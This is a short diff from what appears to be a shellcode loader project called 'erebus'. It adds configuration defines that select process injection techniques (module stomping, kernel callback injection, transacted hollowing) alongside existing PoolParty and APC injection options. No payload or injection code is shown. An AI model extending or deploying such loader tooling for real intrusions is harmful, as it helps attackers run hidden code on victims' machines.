@@ -83,6 +83,12 @@
 #define ExecuteShellcode erebus::InjectionPoolParty
 #elif CONFIG_INJECTION_TYPE == 5
 #define ExecuteShellcode erebus::InjectionNtQueueApcThread
+#elif CONFIG_INJECTION_TYPE == 6
+#define ExecuteShellcode erebus::InjectionModuleStomp
+#elif CONFIG_INJECTION_TYPE == 7
+#define ExecuteShellcode erebus::InjectionKernelCallback
+#elif CONFIG_INJECTION_TYPE == 8
+#define ExecuteShellcode erebus::InjectionTxfHollow
 #endif
 
 // ============================================
